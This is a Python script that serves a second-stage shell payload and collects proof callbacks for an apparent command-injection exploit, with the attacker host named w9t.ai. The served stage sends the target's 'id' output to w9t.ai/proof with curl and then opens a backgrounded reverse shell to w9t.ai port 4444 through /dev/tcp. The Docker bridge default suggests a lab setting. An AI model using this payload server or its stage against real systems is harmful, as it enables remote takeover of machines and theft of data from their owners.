#!/usr/bin/env python3
"""Serve the short command's shell stage and its HTTP proof callback."""

from __future__ import annotations

import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


STAGE = b"""#!/bin/sh
id | curl -fsS -m 5 --data-binary @- http://w9t.ai/proof >/dev/null 2>&1
bash -c 'bash -i >& /dev/tcp/w9t.ai/4444 0>&1' </dev/null >/dev/null 2>&1 &
"""


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--bind", default="172.17.0.1",
                        help="address reachable as w9t.ai from the target")
    args = parser.parse_args()
    result = b""

    class Handler(BaseHTTPRequestHandler):
        def send_body(self, status: int, body: bytes) -> None:
            self.send_response(status)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self) -> None:
            if self.path == "/":
                self.send_body(200, STAGE)
            elif self.path == "/proof":
                if result:
                    self.send_body(200, result)
                else:
                    self.send_error(404)
            else:
                self.send_error(404)

        def do_POST(self) -> None:
            nonlocal result
            if self.path != "/proof":
                self.send_error(404)
                return
            try:
                size = int(self.headers.get("Content-Length", "0"))
            except ValueError:
                self.send_error(400)
                return
            if not 0 < size <= 4096:
                self.send_error(413)
                return
            self.connection.settimeout(5)
            try:
                received = self.rfile.read(size)
            except OSError:
                self.send_error(408)
                return
            if len(received) != size:
                self.send_error(408)
                return
            result = received
            self.send_response(204)
            self.end_headers()

        def log_message(self, *_: object) -> None:
            pass

    server = ThreadingHTTPServer((args.bind, 80), Handler)
    print(f"Serving w9t.ai on {args.bind}:80", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
